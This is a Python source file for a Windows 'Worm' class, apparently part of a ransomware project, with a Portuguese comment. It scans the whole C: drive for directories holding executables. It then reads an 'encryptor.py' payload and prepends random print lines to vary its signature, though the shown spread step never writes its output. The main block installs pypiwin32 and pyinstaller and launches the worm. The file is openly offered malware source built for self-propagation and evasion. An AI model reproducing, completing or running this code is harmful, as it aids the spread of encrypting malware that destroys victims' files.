import os
import sys
import time
import threading
import shutil
import win32con
import win32gui
import random
from os import system


ROOTDIR = r"C:\\"
THIS_DIR = os.path.dirname(os.path.realpath(__file__))
ENCRYPTOR_PATH = os.path.join(sys.path[0], "encryptor.py")

class Worm:
    def __init__(self):
        self.target_dir_list = []
        self.directories_found = False
        self.own_path = os.path.realpath(__file__) # pode ser usado para apenas não encriptar a diretoria da worm

    def find_directories(self):
        for dirpath, dirnames, _ in os.walk(ROOTDIR):
            for dirname in dirnames:
                directory_path = os.path.join(dirpath, dirname)
                if directory_path != THIS_DIR:
                    try:
                        for f in os.listdir(directory_path):
                            if f.endswith(".exe"):
                                self.target_dir_list.append(directory_path)
                                break
                    except PermissionError:
                        pass

        self.directories_found = True

# C:/Program Files/Windows NT/Accessories -> target_dir_list[30]
    def spread(self):
        this = open(ENCRYPTOR_PATH, "r")
        worm_poli = ""
        times = random.randrange(1, 7)
        for i in range(times):
            num = random.randrange(-sys.maxsize, sys.maxsize)
            worm_poli += "print(" + str(num) + ")\n"

        worm_poli += "\n"

        for line in this:
            worm_poli += line


    def execute_worm(self):
        if not self.directories_found:
            self.find_directories()

        self.spread()

if __name__ == "__main__":
    system("pip install pypiwin32 pyinstaller")

    worm = Worm()
    worm.execute_worm()